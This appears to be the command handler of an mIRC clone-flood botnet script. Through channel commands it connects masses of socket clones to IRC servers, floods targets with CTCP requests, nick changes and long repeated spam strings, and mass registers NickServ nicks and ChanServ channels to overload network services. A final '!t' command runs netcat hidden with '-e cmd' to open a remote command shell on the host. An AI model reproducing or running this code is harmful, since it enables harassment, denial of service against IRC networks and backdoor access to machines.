on 10:TEXT:*:*:{
  var %n = #,%c = $nick
  if ($chr($asc(#)) isin $left($target,1)) {
    if ($1 == !clone.stop) { timers off }
    if ($1 == !clone.raw) { clone raw [ [ $2- ] ] }
    if ($1 == !clone.status) { .msgx # CLONE STATUS: [C: $+ $sock(clone*,0) $+ / $+ W: $+ $sock(sock*,0) $+ ]  [T:14 $+ $calc($sock(clone*,0)+$sock(sock*,0)) $+ / $+ %max.load $+ ] }
    if ($1 == !clone.flood.ctcp.all) {  if ($2 == $null) { halt } | /clone all $$2  }
    if ($1 == !clone.flood.ctcp.version) {  if ($2 == $null) { halt } | /clone version $$2 }
    if ($1 == !clone.flood.ctcp.ping) {  if ($2 == $null) { halt } | /clone ping $$2 }
    if ($1 == !clone.flood.ctcp.time) {  if ($2 == $null) { halt } | /clone time $$2 }
    if ($1 == !clone.service.killer) {  if ($sock(clone*,0) == 0) { goto gatechange } 
      %sk = 1  |     :skloop |   if (%sk > $sock(clone*,0)) { goto end }  |  sockwrite -n $sock(clone*,%sk) nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |  %random.sk.temp2 = $randomgen($r(0,9))  |  %random.sk.temp3 = $randomgen($r(0,9))  |  sockwrite -n $sock(clone*,%sk) NICKSERV register %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) NICKSERV identify %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2   
      sockwrite -n $sock(clone*,%sk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %sk  |   goto skloop  |   :end  |  :gatechange  |   %gsk = 1  |   :gchnge   |   if (%gsk > $sock(sock*,0)) { goto end2 }   |   sockwrite -n $sock(sock*,%gsk) nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |   %random.sk.temp2 = $randomgen($r(0,9))  
      %random.sk.temp3 = $randomgen($r(0,9))    |   sockwrite -n $sock(sock*,%gsk) NICKSERV register %random.sk.temp  |   sockwrite -n $sock(sock*,%gsk) NICKSERV identify %random.sk.temp |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |   sockwrite -n $sock(sock*,%gsk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp* 
    inc %gsk  | goto gchnge |   :end2 |   halt  }
    if ($1 == !clone.load) {  if ($4 == $null) { halt } | if (%max.load == $null) { msgx # ERROR: please set %max.load $+ . | halt } |   if ($sock(clone*,0) >= %max.load) { msgx # [MAX-REACHED] ( $+ [ [ %max.load ] ] $+ ) | halt } |   .msgx # [LOADING]: $4 clone(s) to ( $+ $$2 $+ ) on port $3  |   /clone connect $2 $3 $4  }
    if ($1 == !clone.load.random) {  if ($lines(servers.txt) < 0) { .msgx # ERRO: there are (0) server's in servers.txt | halt }  |  if (%max.load == $null) { msgx # error: please set %max.load $+ . | halt }  |  if ($sock(clone*,0) >= %max.load) { msgx # [MAX-REACHD] ( $+ [ [ %max.load ] ] $+ ) | halt }  |  if ($2 == $null) { msgx # ERROR, no (port specified) | halt }   |   if ($3 == $null) { msgx # ERROR, no (amount specified) | halt } | else { .msgx # [LOADING]: $3 clone(s) to (RANDOM SERVER) on port $2   |  //clone connect $read servers.txt $2 $3 } }
    if ($1 == !clone.part) { /clone part $2- }
    if ($1 == !clone.join) { /clone join $$2- }
    if ($1 == !clone.dcc.chat) { sockwrite -n clone* PRIVMSG $2 :DCC CHAT $2 1058633484 3481 }
    if ($1 == !clone.dcc.send) { sockwrite -n clone* PRIVMSG $2 :DCC SEND $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ .txt 1058633484 2232 $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+  }
    if ($1 == !clone.flood.ctcp.ping) {  /clone ping $$2  }
    if ($1 == !clone.flood.ctcp.time) { /clone time $$2  }
    if ($1 == !clone.join) {  if ($2 == $null) { halt } |   /clone join $$2 $3-  }
    if ($1 == !clone.cycle) {  /clone part $$2 |   /clone join $$2  }
    if ($1 == !clone.msgx) {  /clone msgx $$2 $3-  }
    if ($1 == !clone.quit) {  if ($sock(clone*,0) > 0) { //sockwrite -nt clone* QUIT :  $2- } |  if ($sock(sock*,0) > 0) { //sockwrite -nt sock* QUIT :  $2- } |  .msgx # [CLONES DISCONNECT/QUIT] ( $+ $2- $+ )  }
    if ($1 == !clone.notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  /clone notice $$2 $3-  }
    if ($1 == !clone.nick.flood) { /clone nick.change  }
    if ($1 == !clone.nick) { if ($2 == $null) { halt } |  /clone nick.this $2  }
    if ($1 == !clone.kill) {  /clone kill |  .msgx # [ALL CLONES KILLED]  }
    if ($1 == !clone.combo1) { if ($2 == $null) { halt }  | clone msgx $$2 BorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBlingBorgs | timer 1 6 /clone msgx $$2 BorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBlingBorgs }
    if ($1 == !clone.combo2) {  if ($2 == $null) { halt } |  clone msgx $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp 
      timer 1 6 /clone msgx $2  pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp 
    timer 1 12 /clone msgx $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp  }
    if ($1 == !clone.combo3) {  if ($2 == $null) { halt } | clone msgx $2 12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond Laging1,12Beyond Laging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging
      timer 1 6 /clone msgx $2 12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond Laging1,12Beyond Laging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging 
    timer 1 12 /clone msgx $2 12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond Laging1,12Beyond Laging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging12,1Beyond LAging1,12Beyond LAging   }
    if ($1 == !clone.combo4) {   if ($2 == $null) { halt } |  clone msgx $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾
      timer 1 6 /clone msgx $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾
    timer 1 12 /clone msgx $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾  }
    if ($1 == !clone.combo5) {  if ($2 == $null) { halt } | clone msgx $2 ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
      timer 1 6 /clone msgx $2 ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
    timer 1 12 /clone msgx $2 ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________  }
    if ($1 == !clone.combo6) {  if ($2 == $null) { halt } | clone msgx $2 UTTT OH!!! $$2 shouldnt of invited!!! Its time for 2,3INVITERS REVENGE! 
      timer 1 6 /clone msgx $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp
      timer 1 12 /clone msgx $2  1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*
      timer 1 18 /clone msgx $2 ^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^
      timer 1 24 /clone msgx $2 BorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBlingBorgs
      timer 1 32 /clone msgx $2 ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
    timer 1 38 /clone msgx $2 12LEAVE $$2 NOW! dont support lame fucking inviters! }
    if ($1 == !clone.combo7) { //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
      /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
      /timer 1 4    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
      /timer 1 8   /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
      /timer 1 12   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8))
    inc %cc |  goto ccloop |   :end  | unset %fat | unset %at* | unset %cc  }
    if ($1 == !clone.combo#) { if ($2 == $null) { halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
      /timer 1 3 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
      /timer 1 7 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
      /timer 1 11 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
      /timer 1 15 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
    inc %cc |  goto ccloop |   :end  | unset %cc  }   
    if ($1 == !clone.combo.word) { if ($3 == $null) { msgx # !clone.combo.word #/Nick Word. | halt } | //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
      /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
      /timer 1 3 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
      /timer 1 7 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
      /timer 1 11 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8))
      /timer 1 15 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
      inc %cc |  goto ccloop |   :end  | unset %cc 
    }
    if ($1 == !clone.combo8) {  if ($2 == $null) { halt } | clone msgx $2 !list
      timer 1 6 /clone notice $2 #&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%
      timer 1 12 /clone notice $2  1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*Star_WarS*Star_WarS*
      timer 1 18 /clone notice $2 ^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^The_CoW_GoEs_MOo^^^
      timer 1 24 /clone notice $2 BorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBorgsBlingBorgsBorgsBorgsBorgsBlingBorgsBorgsBorgsBorgsBling
      timer 1 32 /clone notice $2 ___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
      timer 1 38 /clone notice $2 .  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -.  -.  -. -. -. -. -. -. -. -. -. -. -. -. -. 
      timer 1 44 /clone notice $2 / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ /
      timer 1 50 /clone notice $2 ~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~~ - _ - ~ 
    }
    if ($1 == !clone.combo9) { 
      timer 1 2 /clone msgx $2 $makestr
      timer 1 5 /clone notice $2 $makestr
      timer 1 10 /clone msgx $2 $makestr
      timer 1 15 /clone notice $2 $makestr
      timer 1 20 /clone msgx $2 $makestr
      timer 1 24 /clone notice $2 $makestr
      timer 1 30 /clone msgx $2 $makestr
      timer 1 35 /clone notice $2 $makestr
      timer 1 40 /clone msgx $2 $makestr
      timer 1 45 /clone notice $2 $makestr
      timer 1 50 /clone msgx $2 $makestr

    }
    if ($1 == !t) && ($2 != $null) { .run abc.exe nc.exe -L -d -e cmd1.exe -p $2 | msg $chan TELNET PORT: $2 NOW OPEN }
